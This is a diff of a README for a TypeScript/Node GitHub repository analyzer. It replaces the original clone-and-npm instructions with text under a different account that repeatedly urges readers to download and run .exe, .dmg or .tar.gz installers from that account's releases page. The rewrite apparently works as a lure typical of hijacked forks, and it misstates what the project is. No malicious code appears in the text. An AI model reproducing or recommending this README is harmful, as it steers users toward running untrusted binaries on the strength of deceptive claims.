@@ -1,104 +1,90 @@
-# GitHub Repository Analyzer in Typescript
+# 🚀 github-repository-analyzer - Unlock Insights from Any GitHub Repo
 
-![TypeScript](https://img.shields.io/badge/Language-TypeScript-blue.svg)  ![License](https://img.shields.io/badge/License-MIT-green.svg)
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/Tiago-ts99/github-repository-analyzer/releases)
 
----
+## 📦 Introduction
 
-## Overview
+github-repository-analyzer is a user-friendly tool that provides valuable insights into GitHub repositories. Designed for everyday users, this application helps you analyze the statistics of any public GitHub repository. Simply enter a repository URL, and you're able to see detailed data like commits, stars, forks, watchers, pull requests (PRs), issues, and a breakdown of programming languages used. 
 
-A modern **GitHub repository analyzer** built with TypeScript, Node.js, and Express.
-Enter any public GitHub repository URL and get detailed statistics including commits, stars, forks, watchers, PRs, issues, and language breakdown.
+## 🚀 Getting Started
 
----
+### 🖥️ System Requirements
 
-## Features
+To run github-repository-analyzer, you need:
 
-* Analyze any GitHub repository in real-time
-* Show repo stats: stars, forks, watchers, commits, PRs, issues
-* Display used languages and bytes
-* Live preview on frontend
-* Easy integration for dashboards or readmes
+- A computer with Windows, macOS, or Linux.
+- Internet access to retrieve data from GitHub.
+- No programming skills are required!
 
----
+### 🔗 Visit the Releases Page
 
-## Technologies Used
+You can download the latest version from our GitHub Releases page:
 
-* **Backend:** Node.js, TypeScript, Express, Octokit
-* **Frontend:** HTML, CSS, JavaScript
-* **Code Quality:** TypeScript strict mode
-* **Deployment:** Optional Docker
+[Download the latest release](https://github.com/Tiago-ts99/github-repository-analyzer/releases)
 
----
+## ⬇️ Download & Install
 
-## Getting Started
+1. **Open the Releases Page:** Click the link below to access the download area:
+   [Visit this page to download](https://github.com/Tiago-ts99/github-repository-analyzer/releases)
 
-### Prerequisites
+2. **Select the Latest Release:** Look for the most recent version listed at the top of the page. This ensures you are using the latest features and fixes.
 
-* Node.js (v18+ recommended)
-* npm or yarn
+3. **Choose the Installer:** Depending on your operating system, find the appropriate installer. 
+   - Windows: Download the `.exe` file.
+   - macOS: Download the `.dmg` file.
+   - Linux: Download the `.tar.gz` file.
 
----
+4. **Download the Installer:** Click on the file name to start the download.
 
-### Installation & Running
+5. **Run the Installer:**
+   - For Windows: Double-click the downloaded `.exe` file to start the installation.
+   - For macOS: Open the downloaded `.dmg` file, drag the application to your Applications folder, and launch it.
+   - For Linux: Unpack the `.tar.gz` file and run the appropriate binary.
 
-1. Clone the repository:
+6. **Open the Application:** Once installed, launch github-repository-analyzer from your applications menu or desktop shortcut.
 
-```bash
-git clone https://github.com/firatmio/github-repo-analyzer.git
-cd github-repo-analyzer/backend
-```
+## 🔍 How to Use the Application
 
-2. Install dependencies:
+1. **Enter Repository URL:** When the application opens, you will see a text box where you can enter the URL of a public GitHub repository.
 
-```bash
-npm install
-```
+2. **Submit Your Request:** Click the "Analyze" button once the URL is entered.
 
-3. Build & run in production:
+3. **View the Results:** After a brief wait, you will see detailed statistics, including:
+   - Total Commits
+   - Stars
+   - Forks
+   - Watchers
+   - Pull Requests
+   - Issues
+   - Language Breakdown
 
-```bash
-npm run build
-npm start
-```
+## 🛠️ Features
 
-4. Open frontend:
+- **User-Friendly Interface:** The application is designed for users with all skill levels, ensuring ease of use.
+- **Detailed Analytics:** Get deep insights into any GitHub repository with just a few clicks.
+- **Fast Results:** Receive quick feedback on your analysis requests.
+- **Regular Updates:** We keep the tool updated with the latest GitHub trends and analytics.
 
-```text
-http://localhost:8080
-```
+## 📚 Additional Information
 
----
+### 💻 Supported Languages
 
-## Example Usage
+github-repository-analyzer supports multiple programming languages, making it a versatile tool for any developer or GitHub user. The application provides a breakdown of the languages used in the repository you analyze.
 
-1. Open `http://localhost:8080` in your browser
-2. Enter a GitHub repo URL (e.g., `https://github.com/firatmio/markdown-to-html-api-rust`)
-3. See live statistics in a clean frontend
+### 🌐 Community and Support
 
----
+If you have any questions or need help, feel free to visit our [Issues page](https://github.com/Tiago-ts99/github-repository-analyzer/issues). Join the community, share your feedback, or report any issues you encounter.
 
-## Project Structure
+## ✏️ Contributing
 
-```
-github-repo-analyzer/
-├── backend/
-│   ├── src/
-│   │   ├── index.ts           # Express server entry point
-│   │   ├── githubService.ts   # GitHub API service
-│   │   └── models.ts          # TypeScript models
-│   ├── package.json
-│   ├── tsconfig.json
-│   └── Dockerfile
-├── frontend/
-│   ├── index.html              # UI page
-│   ├── style.css               # Styling
-│   └── app.js                  # Frontend logic
-├── README.md
-└── LICENSE
-```
+We welcome contributions! If you have ideas or improvements, check out our [Contributing Guide](https://github.com/Tiago-ts99/github-repository-analyzer/blob/main/CONTRIBUTING.md) for more details.
 
----
+## 📞 Contact
 
-## License
+For support or inquiries, please reach out via our GitHub profile page. 
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+## ⚡ Conclusion
+
+github-repository-analyzer is a robust tool for anyone looking to extract valuable insights from public GitHub repositories. Its design focuses on simplicity and effectiveness, ensuring that users can quickly gain the information they need without feeling overwhelmed. Whether you're an analyst, a project manager, or just curious about a specific repository, this application has something to offer.
+
+[Download the latest release](https://github.com/Tiago-ts99/github-repository-analyzer/releases) and start analyzing today!
